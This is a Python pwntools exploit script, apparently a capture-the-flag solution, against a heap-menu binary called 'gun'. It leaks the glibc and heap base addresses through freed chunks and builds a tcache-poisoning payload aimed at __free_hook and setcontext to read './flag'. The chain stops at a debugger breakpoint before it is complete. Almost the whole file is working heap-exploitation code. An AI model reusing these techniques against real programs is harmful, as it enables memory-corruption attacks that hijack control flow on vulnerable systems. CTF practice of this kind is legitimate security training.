#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# Author: i0gan
# Env: Linux arch 5.8.14-arch1-1

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'gun'
#libc_path = './libc.so.6'
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'

# remote server ip and port
server_ip = "0.0.0.0"
server_port = 0

# if local debug
LOCAL = 1
LIBC = 1

#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)

def shoot(t):
	sla('>', '1')
	sla(':', str(t))

def load(n):
	sla('>', '2')
	sla('?', str(n))

def buy(n, d):
	sla('>', '3')
	sla(':', str(n))
	sa(':', d)

def quit():
	sla('>', '4')
	
	

#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	# leak libc
	sla(':', 'I0gan')
	buy(0x450, 'X' * 0x10 + '\n') # 0
	buy(0x10, 'A' * 8 + '\n') # 1
	load(0)
	shoot(1)
	buy(0x10, 'X' * 8 +'\n'); # 0
	load(0)
	shoot(1)
	libc_base = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00') - 0x1ebf80 - 96
	li('libc_base :' + hex(libc_base))
	# release
	load(1)
	shoot(1)


	# leak heap base
	n = 9
	for _ in range(n):
		buy(0x80, 'A' + str(_) + '\n')
	for i in range(n):
		load(n - i - 1)
	shoot(n)

	p = p64(0) * 0x10
	p += p64(0) + p64(0x31)
	p += p64(0) * 5 + p64(0x21) + b'\n'
	buy(0x410, p) # 0
	buy(0x20, 'a\n') # 1
	for i in range(6):
		buy(0x10, 'A\n') # 1 ~ 7

	load(7)
	load(1) # 1
	shoot(3)

	load(0)
	shoot(1)

	buy(0x20, '\n')
	load(0)
	shoot(1)
	ru('The ')
	leak = u64(r(6) + b'\x00\x00')
	heap_base = leak - (0x55962cf186e0 - 0x55962cf18000 )
	li('heap base' + hex(heap_base))
	
	setcontext = libc_base + libc.sym['setcontext'] + 0x3d
	free_hook = libc_base + libc.sym['__free_hook']

	p = p64(0)
	p += p64(heap_base + 0x740)
	p += p64(0)
	p = p.ljust(0x80, b'\x00')
	p += p64(0)
	p += p64(31) 
	p += p64(free_hook)
	p += p64(0) * 4
	p += p64(0x21)
	p += b'./flag\x00\x00'
	p += p64(0)
	p += b'\n'
	buy(0x1b0, p)

	li('setcontext: ' + hex(setcontext))
	db()


	

def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_PRELOAD" : libc_path} )
		else:
			io = elf.process()
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
